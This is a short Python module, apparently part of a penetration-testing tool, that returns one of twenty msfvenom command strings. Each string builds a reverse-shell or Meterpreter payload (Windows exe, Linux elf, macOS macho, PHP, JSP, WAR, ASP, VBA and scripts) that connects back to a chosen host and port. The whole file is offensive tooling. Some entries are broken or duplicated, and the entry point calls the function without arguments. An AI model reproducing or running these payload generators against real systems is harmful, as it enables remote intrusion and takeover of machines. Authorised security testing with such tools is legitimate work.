#!/usr/bin/python3

#This File is Module
#Require msfvenom 

def payload_gen(lhost,selected_port,cmd_number):

    payload1  = f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={selected_port} -f exe > shell.exe"
    payload2  = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={selected_port} -f elf > shell.elf"
    payload3  = f"msfvenom -p linux/x86/meterpreter_reverse_http LHOST={lhost} LPORT={selected_port} -f elf > shell.elf"
    payload4  = f"msfvenom -p linux/x64/meterpreter_reverse_http LHOST={lhost} LPORT={selected_port} -f elf > shell.elf"
    payload5  = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={selected_port} -f exe > shell.exe"
    payload6  = f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={selected_port} -f exe > shell.exe"
    payload7  = f"msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={selected_port} -f exe > shell.exe"
    payload8  = f"msfvenom -p windows/meterpreter/reverse_https LHOST={lhost} LPORT={selected_port} -f exe > shell.exe"
    payload9  = f"msfvenom -p cmd/windows/reverse_powershell LHOST={lhost} LPORT={selected_port} > shell.bat"
    payload10 = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={selected_port} -f vba"
    payload11 = f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT={selected_port} -f macho > shell.macho"
    payload12 = f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT={selected_port} -f < platform"
    payload13 = f"msfvenom -p cmd/unix/reverse_python LHOST={lhost} LPORT={selected_port} -f raw > shell.py"
    payload14 = f"msfvenom -p cmd/unix/reverse_bash LHOST={lhost} LPORT={selected_port} -f raw > shell.sh"
    payload15 = f"msfvenom -p cmd/unix/reverse_perl LHOST={lhost} LPORT={selected_port} -f raw > shell.pl"
    payload16 = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={selected_port} -f asp > shell.asp"
    payload17 = f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={selected_port} -f raw > shell.jsp"
    payload18 = f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={selected_port} -f war > shell.war"
    payload19 = f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={selected_port} -f raw > shell.php"
    payload20 = f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={selected_port} -f raw > shell.php"

    fire_stored = [payload1,payload2,payload3,payload4,payload5,payload6,payload7,payload8,payload9,payload10,payload11,payload12,payload13,payload14,payload15,payload16,payload17,payload18,payload19,payload20]

    generated_payload = (fire_stored[int(cmd_number)])    
    
    return generated_payload

if __name__ == "__main__":

    payload_gen()
  
